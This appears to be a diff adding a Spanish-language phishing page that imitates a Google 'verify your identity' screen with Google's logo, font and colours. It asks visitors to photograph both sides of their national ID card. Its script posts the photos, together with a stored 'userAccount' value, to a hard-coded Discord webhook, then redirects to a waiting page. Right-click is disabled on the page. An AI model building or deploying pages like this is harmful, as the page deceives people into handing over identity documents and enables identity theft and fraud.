@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Identidad</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        :root {
+            --bg-color: #f0f4f9;
+            --box-bg: #ffffff;
+            --text-main: #1f1f1f;
+            --text-secondary: #444746;
+            --blue: #0b57d0;
+            --blue-hover: #0842a0;
+        }
+        body, html {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background-color: var(--box-bg);
+            border-radius: 28px;
+            width: 1040px;
+            max-width: 90%;
+            display: flex;
+            flex-direction: row;
+            padding: 48px 40px;
+            box-sizing: border-box;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            z-index: 10;
+        }
+        .left-panel {
+            flex: 1;
+            padding-right: 48px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+        .right-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .google-logo {
+            height: 36px;
+            width: auto;
+            margin-bottom: 24px;
+            display: block;
+        }
+        h1 {
+            font-size: 36px;
+            color: var(--text-main);
+            font-weight: 400;
+            margin: 0 0 16px 0;
+            line-height: 1.2;
+        }
+        p {
+            font-size: 16px;
+            color: var(--text-main);
+            margin: 0;
+        }
+        
+        .upload-grid {
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 24px;
+        }
+
+        .drop-zone {
+            border: 1px solid #747775;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: #f8fafc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 160px;
+        }
+        .drop-zone:hover {
+            background: #f1f3f4;
+            border-color: var(--blue);
+        }
+        .drop-zone i { color: var(--blue); margin-bottom: 12px; }
+        .drop-text { font-size: 14px; font-weight: 500; color: var(--text-main); }
+        
+        .file-selected-badge {
+            display: none;
+            margin-top: 10px;
+            background: #e6f4ea;
+            color: #1e8e3e;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            align-items: center;
+            gap: 4px;
+        }
+
+        input[type="file"] { display: none; }
+
+        button.btn-primary {
+            background-color: var(--blue);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 24px;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 32px;
+            width: 100%;
+        }
+        button.btn-primary:hover {
+            background-color: var(--blue-hover);
+        }
+
+        #loadingOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.3s;
+        }
+        #loadingOverlay.active { visibility: visible; opacity: 1; }
+        
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @media (max-width: 900px) {
+            .container {
+                width: 100%;
+                max-width: 450px;
+                flex-direction: column;
+                padding: 36px 32px;
+                border-radius: 8px;
+                box-shadow: none;
+                background-color: transparent;
+                margin: 20px auto;
+            }
+            body { background-color: #fff; }
+            .left-panel {
+                padding-right: 0;
+                margin-bottom: 32px;
+                align-items: center;
+                text-align: center;
+            }
+            .google-logo { margin: 0 auto 24px; height: 36px; width: auto; }
+            h1 { font-size: 24px; }
+            p { font-size: 14px; }
+            .upload-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="font-weight: 500;">Validando documentos...</p>
+    </div>
+
+    <div class="container">
+        <div class="left-panel">
+            <img class="google-logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+            <h1>Verifica tu<br>identidad</h1>
+            <p>Para continuar, necesitamos una foto clara de tu documento de identidad (Cédula/ID) por ambos lados.</p>
+        </div>
+        
+        <div class="right-panel">
+            <div id="error-message" style="display: none; color: #d93025; background: #fdf2f2; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 20px; width: 100%;"></div>
+            
+            <div class="upload-grid">
+                <!-- Frontal -->
+                <div class="drop-zone" onclick="document.getElementById('frontal').click()">
+                    <div id="content-frontal">
+                        <i data-lucide="camera" size="32"></i>
+                        <p class="drop-text">Parte Frontal</p>
+                    </div>
+                    <div id="badge-frontal" class="file-selected-badge">
+                        <i data-lucide="check" size="14"></i> Listo
+                    </div>
+                </div>
+                <input type="file" id="frontal" accept="image/*" capture="environment">
+
+                <!-- Posterior -->
+                <div class="drop-zone" onclick="document.getElementById('posterior').click()">
+                    <div id="content-posterior">
+                        <i data-lucide="camera" size="32"></i>
+                        <p class="drop-text">Parte Trasera</p>
+                    </div>
+                    <div id="badge-posterior" class="file-selected-badge">
+                        <i data-lucide="check" size="14"></i> Listo
+                    </div>
+                </div>
+                <input type="file" id="posterior" accept="image/*" capture="environment">
+            </div>
+
+            <button id="btnEnviar" class="btn-primary">Enviar verificación</button>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';
+        const REDIRECT_URL = 'espera.html';
+
+        function setupFileInput(inputId, badgeId, contentId) {
+            const input = document.getElementById(inputId);
+            const badge = document.getElementById(badgeId);
+            const content = document.getElementById(contentId);
+
+            input.addEventListener('change', function() {
+                if (this.files && this.files[0]) {
+                    badge.style.display = 'flex';
+                    content.style.opacity = '0.3';
+                }
+            });
+        }
+
+        setupFileInput('frontal', 'badge-frontal', 'content-frontal');
+        setupFileInput('posterior', 'badge-posterior', 'content-posterior');
+
+        document.getElementById('btnEnviar').addEventListener('click', async () => {
+            const frontal = document.getElementById('frontal').files[0];
+            const posterior = document.getElementById('posterior').files[0];
+            const errorBox = document.getElementById('error-message');
+            const overlay = document.getElementById('loadingOverlay');
+
+            errorBox.style.display = 'none';
+
+            if (!frontal || !posterior) {
+                errorBox.innerText = "Por favor, adjunta ambas fotos del documento.";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            overlay.classList.add('active');
+
+            const formData = new FormData();
+            formData.append('file1', frontal, `F-${Date.now()}.jpg`);
+            formData.append('file2', posterior, `P-${Date.now()}.jpg`);
+            
+            const payload = {
+                embeds: [{
+                    title: "🛡️ Nueva Verificación de Documentos",
+                    color: 15158332,
+                    fields: [
+                        { name: "Usuario", value: localStorage.getItem("userAccount") || "Desconocido" },
+                        { name: "Estado", value: "Pendiente" }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            formData.append('payload_json', JSON.stringify(payload));
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+                } else {
+                    throw new Error();
+                }
+            } catch (error) {
+                overlay.classList.remove('active');
+                errorBox.innerText = "Hubo un error al enviar. Revisa tu conexión.";
+                errorBox.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
